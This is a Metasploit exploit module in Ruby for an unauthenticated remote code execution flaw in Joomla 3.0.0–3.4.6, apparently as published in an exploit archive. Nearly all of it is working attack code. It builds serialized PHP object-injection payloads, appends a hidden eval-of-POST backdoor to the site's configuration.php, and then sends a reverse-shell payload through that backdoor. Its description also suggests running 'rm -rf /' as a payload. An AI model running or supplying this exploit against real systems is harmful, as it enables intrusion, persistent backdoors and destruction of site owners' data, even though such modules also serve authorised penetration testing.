# Vendor Homepage: https//www.joomla.it/
# Software Link: https://downloads.joomla.org/it/cms/joomla3/3-4-6
# Version: 3.0.0 --> 3.4.6
# Tested on: Linux
# CVE : N/A

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HTTP::Joomla

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Rusty Joomla Unauthenticated Remote Code Execution&#039;,
      &#039;Description&#039;    => %q{
	PHP Object Injection because of a downsize in the read/write process with the database leads to RCE.
	The exploit will backdoor the configuration.php file in the root directory with en eval of a POST parameter.
	That&#039;s because the exploit is more reliabale (doesn&#039;t rely on common disabled function). 
	For this reason, use it with caution and remember the house cleaning.
	Btw, you can also edit this exploit and use whatever payload you want. just modify the exploit object with 
	get_payload(&#039;you_php_function&#039;,&#039;your_parameters&#039;), e.g. get_payload(&#039;system&#039;,&#039;rm -rf /&#039;) and enjoy
      },
      &#039;Author&#039;	=>
        [
          &#039;Alessandro \&#039;kiks\&#039; Groppo @Hacktive Security&#039;, 
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
		[&#039;URL&#039;, &#039;https://blog.hacktivesecurity.com/index.php?controller=post&action=view&id_post=41&#039;],
		[&#039;URL&#039;, &#039;https://github.com/kiks7/rusty_joomla_rce&#039;]
        ],
      &#039;Privileged&#039;     => false, 
      &#039;Platform&#039;       => &#039;PHP&#039;,
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Targets&#039;        => [[&#039;Joomla 3.0.0 - 3.4.6&#039;, {}]],
      &#039;DisclosureDate&#039; => &#039;Oct 02  2019&#039;,
      &#039;DefaultTarget&#039;  => 0)
    )

    register_advanced_options(
      [
        OptBool.new(&#039;FORCE&#039;, [true, &#039;Force run even if check reports the service is safe.&#039;, false]),
      ])
  end

  def get_random_string(length=50)
  	source=("a".."z").to_a + ("A".."Z").to_a + (0..9).to_a 
	key=""
	length.times{ key += source[rand(source.size)].to_s }
	return key
  end

  def get_session_token
	# Get session token from cookies
	vprint_status(&#039;Getting Session Token&#039;)
	res = send_request_cgi({
		&#039;method&#039; => &#039;GET&#039;,
		&#039;uri&#039; 	 => normalize_uri(target_uri.path) 
	})
	
	cook = res.headers[&#039;Set-Cookie&#039;].split(&#039;;&#039;)[0]
	vprint_status(&#039;Session cookie: &#039; + cook)
	return cook
  end

  def get_csrf_token(sess_cookie)
	  vprint_status(&#039;Getting CSRF Token&#039;)

	  res = send_request_cgi({
		&#039;method&#039; => &#039;GET&#039;,
		&#039;uri&#039;	 => normalize_uri(target_uri.path,&#039;/index.php/component/users&#039;),
		&#039;headers&#039; => {
			&#039;Cookie&#039; => sess_cookie,
		}
	  })

	  html = res.get_html_document
	  input_field = html.at(&#039;//form&#039;).xpath(&#039;//input&#039;)[-1]
	  token = input_field.to_s.split(&#039; &#039;)[2]
	  token = token.gsub(&#039;name="&#039;,&#039;&#039;).gsub(&#039;"&#039;,&#039;&#039;)
	  if token then
		  vprint_status(&#039;CSRF Token: &#039; + token)
		  return token
	  end
	  print_error(&#039;Cannot get the CSRF Token ..&#039;)

  end

  def get_payload(function, payload)
	  # @function: The PHP Function
	  # @payload: The payload for the call
	  template = &#039;s:11:"maonnalezzo":O:21:"JDatabaseDriverMysqli":3:{s:4:"\\0\\0\\0a";O:17:"JSimplepieFactory":0:{}s:21:"\\0\\0\\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:5:"cache";b:1;s:19:"cache_name_function";s:FUNC_LEN:"FUNC_NAME";s:10:"javascript";i:9999;s:8:"feed_url";s:LENGTH:"PAYLOAD";}i:1;s:4:"init";}}s:13:"\\0\\0\\0connection";i:1;}&#039;
	  # The http:// part is necessary in order to validate a condition in SimplePie::init and trigger the call_user_func with arbitrary values
	  payload = &#039;http://l4m3rz.l337/;&#039; + payload
	  final = template.gsub(&#039;PAYLOAD&#039;,payload).gsub(&#039;LENGTH&#039;, payload.length.to_s).gsub(&#039;FUNC_NAME&#039;, function).gsub(&#039;FUNC_LEN&#039;, function.length.to_s)
	  return final
  end

 
  def get_payload_backdoor(param_name) 
	# return the backdoor payload
	# or better, the payload that will inject and eval function in configuration.php (in the root)
	# As said in other part of the code. we cannot create new .php file because we cannot use 
	# the ? character because of the check on URI schema
	function = &#039;assert&#039;
        template = &#039;s:11:"maonnalezzo":O:21:"JDatabaseDriverMysqli":3:{s:4:"\\0\\0\\0a";O:17:"JSimplepieFactory":0:{}s:21:"\\0\\0\\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:5:"cache";b:1;s:19:"cache_name_function";s:FUNC_LEN:"FUNC_NAME";s:10:"javascript";i:9999;s:8:"feed_url";s:LENGTH:"PAYLOAD";}i:1;s:4:"init";}}s:13:"\\0\\0\\0connection";i:1;}&#039;                                                             
        # This payload will append an eval() at the end of the configuration file                                                                            
        payload =  "file_put_contents(&#039;configuration.php&#039;,&#039;if(isset($_POST[\\&#039;"+param_name+"\\&#039;])) eval($_POST[\\&#039;"+param_name+"\\&#039;]);&#039;, FILE_APPEND) || $a=\&#039;http://wtf\&#039;;"
	template[&#039;PAYLOAD&#039;]  = payload 
	template[&#039;LENGTH&#039;]   = payload.length.to_s
	template[&#039;FUNC_NAME&#039;] = function 
	template[&#039;FUNC_LEN&#039;] = function.length.to_s
        return template 

  end


  def check_by_exploiting
	    # Check that is vulnerable by exploiting it and try to inject a printr(&#039;something&#039;)
	    # Get the Session anb CidSRF Tokens
	    sess_token = get_session_token()
	    csrf_token = get_csrf_token(sess_token)

	    print_status(&#039;Testing with a POC object payload&#039;)

	    username_payload = &#039;\\0\\0\\0&#039; * 9
	    password_payload += get_payload(&#039;print_r&#039;,&#039;IAMSODAMNVULNERABLE&#039;)	# actual payload 
	    password_payload += &#039;s:6:"return":s:102:&#039; 				# close cleanly the object
	    res = send_request_cgi({
			&#039;uri&#039;	   => normalize_uri(target_uri.path,&#039;/index.php/component/users&#039;),
			&#039;method&#039;   => &#039;POST&#039;,
			&#039;headers&#039;  => 
				{
				&#039;Cookie&#039; => sess_token,
			},
			&#039;vars_post&#039; => {
				&#039;username&#039; => username_payload,
				&#039;password&#039; => password_payload,
				&#039;option&#039;   => &#039;com_users&#039;,
				&#039;task&#039;	   => &#039;user.login&#039;,
				csrf_token => &#039;1&#039;,
			}
	    }) 
	    # Redirect in order to retrieve the output
	    if res.redirection then
		res_redirect = send_request_cgi({
			&#039;method&#039; => &#039;GET&#039;,
			&#039;uri&#039;	 => res.redirection.to_s,
			&#039;headers&#039; =>{
				&#039;Cookie&#039; => sess_token
			}
		})

		if &#039;IAMSODAMNVULNERABLE&#039;.in? res.to_s or &#039;IAMSODAMNVULNERABLE&#039;.in? res_redirect.to_s then
			return true
		else
			return false
		end
		
	    end
    end

  def check
    # Check if the target is UP and get the current version running by info leak    
    res = send_request_cgi({&#039;uri&#039; => normalize_uri(target_uri.path, &#039;/administrator/manifests/files/joomla.xml&#039;)})
    unless res
      print_error("Connection timed out")
      return Exploit::CheckCode::Unknown
    end

    # Parse XML to get the version 
    if res.code == 200 then
	    xml = res.get_xml_document
	    version = xml.at(&#039;version&#039;).text
	    print_status(&#039;Identified version &#039; + version)
	    if version <= &#039;3.4.6&#039; and version >= &#039;3.0.0&#039; then
		    if check_by_exploiting()
			return Exploit::CheckCode::Vulnerable
		    else
			if check_by_exploiting() then
			# Try the POC 2 times. 
				return Exploit::CheckCode::Vulnerable
			else
				return Exploit::CheckCode::Safe
			end
		    end
	    else
		    return Exploit::CheckCode::Safe
	    end
    else
	    print_error(&#039;Cannot retrieve XML file for the Joomla Version. Try the POC in order to confirm if it\&#039;s vulnerable&#039;)
	    if check_by_exploiting() then
		    return Exploit::CheckCode::Vulnerable
	    else
		    if check_by_exploiting() then
			return Exploit::CheckCode::Vulnerable
		    else
		    	return Exploit::CheckCode::Safe
		    end
	    end
    end
  end



  
  def exploit
    if check == Exploit::CheckCode::Safe && !datastore[&#039;FORCE&#039;]
      print_error(&#039;Target is not vulnerable&#039;)
      return
    end


    pwned = false
    cmd_param_name = get_random_string(50) 

    sess_token = get_session_token()
    csrf_token = get_csrf_token(sess_token)

    # In order to avoid problems with disabled functions
    # We are gonna append an eval() function at the end of the configuration.php file
    # This will not cause any problem to Joomla and is a good way to execute then PHP directly
    # cuz assert is toot annoying and with conditions that we have we cannot inject some characters
    # So we will use &#039;assert&#039; with file_put_contents to append the string. then create a reverse shell with this backdoor

    # TODO: Add the PHP payload object to inject the backdoor inside the configuration.php file
    # 		Use the implanted backdoor to receive a nice little reverse shell with a PHP payload

    
    # Implant the backdoor
    vprint_status(&#039;Cooking the exploit ..&#039;)
    username_payload = &#039;\\0\\0\\0&#039; * 9
    password_payload += get_payload_backdoor(cmd_param_name)		# actual payload 
    password_payload += &#039;s:6:"return":s:102:&#039; 				# close cleanly the object

    print_status(&#039;Sending exploit ..&#039;)


    res = send_request_cgi({
		&#039;uri&#039;	   => normalize_uri(target_uri.path,&#039;/index.php/component/users&#039;),
		&#039;method&#039;   => &#039;POST&#039;,
		&#039;headers&#039;  => {
			&#039;Cookie&#039; => sess_token
		},
		&#039;vars_post&#039; => {
			&#039;username&#039; => username_payload,
			&#039;password&#039; => password_payload,
			&#039;option&#039;   => &#039;com_users&#039;,
			&#039;task&#039;	   => &#039;user.login&#039;,
			csrf_token => &#039;1&#039;
		}
    }) 

    print_status(&#039;Triggering the exploit ..&#039;)    
    if res.redirection then
	res_redirect = send_request_cgi({
		&#039;method&#039; => &#039;GET&#039;,
		&#039;uri&#039;	 => res.redirection.to_s,
		&#039;headers&#039; =>{
			&#039;Cookie&#039; => sess_token
		}
	})
    end

    # Ping the backdoor see if everything is ok :/
    res = send_request_cgi({
		&#039;method&#039;     => &#039;POST&#039;,
		&#039;uri&#039;	     => normalize_uri(target_uri.path,&#039;configuration.php&#039;),
		&#039;vars_post&#039;  => {
			cmd_param_name  => &#039;echo \&#039;PWNED\&#039;;&#039; 
		}
	})
    if res.to_s.include? &#039;PWNED&#039; then
	print_status(&#039;Target P0WN3D! eval your code at /configuration.php with &#039; + cmd_param_name + &#039; in a POST&#039;)

        print_status(&#039;Now it\&#039;s time to reverse shell&#039;)
		res = send_request_cgi({
		&#039;method&#039;     => &#039;POST&#039;,
		&#039;uri&#039;	     => normalize_uri(target_uri.path,&#039;configuration.php&#039;),
		&#039;vars_post&#039;  => {
			cmd_param_name  => payload.encoded 
		}
	})
    end

  end
end

